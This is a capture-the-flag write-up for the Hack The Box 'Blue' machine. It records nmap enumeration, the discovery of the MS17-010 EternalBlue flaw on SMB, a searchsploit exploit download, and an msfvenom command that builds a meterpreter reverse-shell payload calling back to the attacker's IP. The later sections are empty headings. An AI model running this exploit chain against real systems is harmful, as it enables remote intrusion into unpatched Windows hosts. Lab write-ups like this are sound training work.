# Blue

## IP: 10.10.10.40

Start by mapping `blue.htb` to `10.10.10.40` in `/etc/hosts`.

### Enumeration

```bash
$ nmap -vvv -sCV -Pn -oN blue.nmap blue.htb
Nmap scan report for blue.htb (10.10.10.40)
Host is up, received user-set (0.10s latency).
Scanned at 2020-05-23 23:56:31 EDT for 95s
Not shown: 990 closed ports
Reason: 990 conn-refused
PORT      STATE    SERVICE      REASON      VERSION
135/tcp   open     msrpc        syn-ack     Microsoft Windows RPC
139/tcp   open     netbios-ssn  syn-ack     Microsoft Windows netbios-ssn
445/tcp   open     microsoft-ds syn-ack     Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
41511/tcp filtered unknown      no-response
49152/tcp open     msrpc        syn-ack     Microsoft Windows RPC
49153/tcp open     msrpc        syn-ack     Microsoft Windows RPC
49154/tcp open     msrpc        syn-ack     Microsoft Windows RPC
49155/tcp open     msrpc        syn-ack     Microsoft Windows RPC
49156/tcp open     msrpc        syn-ack     Microsoft Windows RPC
49157/tcp open     msrpc        syn-ack     Microsoft Windows RPC
Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -16m04s, deviation: 34m37s, median: 3m54s
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 32044/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 12383/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 19006/udp): CLEAN (Timeout)
|   Check 4 (port 55533/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-os-discovery:
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: haris-PC
|   NetBIOS computer name: HARIS-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2020-05-24T05:01:51+01:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2020-05-24T04:01:53
|_  start_date: 2020-05-24T03:32:05
```

No vulnerability scripts seem to have run. Let's try running them more explicitly.

```bash
$ nmap -Pn -n --script "safe" -p 445 blue.htb
...
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|
|     Disclosure date: 2017-03-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
...
```

So, it looks like port 445 is vulnerable to `Eternal Blue`. Let's pull down some PoCs and mess with them.

## Exploitation

```bash
earchsploit ms17-010
------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                          |  Path
------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Microsoft Windows - 'EternalRomance'/'EternalSynergy'/'EternalChampion' SMB Remote Code Execution (Metasploit) (MS17-01 | windows/remote/43970.rb
Microsoft Windows - SMB Remote Code Execution Scanner (MS17-010) (Metasploit)                                           | windows/dos/41891.rb
Microsoft Windows 7/2008 R2 - 'EternalBlue' SMB Remote Code Execution (MS17-010)                                        | windows/remote/42031.py
Microsoft Windows 7/8.1/2008 R2/2012 R2/2016 R2 - 'EternalBlue' SMB Remote Code Execution (MS17-010)                    | windows/remote/42315.py
Microsoft Windows 8/8.1/2012 R2 (x64) - 'EternalBlue' SMB Remote Code Execution (MS17-010)                              | windows_x86-64/remote/42030.py
Microsoft Windows Server 2008 R2 (x64) - 'SrvOs2FeaToNt' SMB Remote Code Execution (MS17-010)                           | windows_x86-64/remote/41987.py
------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results

# Download the exploit
$ searchsploit -m windows/remote/42315.py

$ python2 42315.py
```

So, we have to generate our own shellcode to be run. Let's use `msfvenom` to do that.

```bash
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.4 LPORT=1234 -f exe > shell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 341 bytes
Final size of exe file: 73802 bytes
```

I modify the exploit to write my file to the Samba share and then execute it,

### Reverse Shell


### User Privilege Escalation


### Root Privilege Escalation
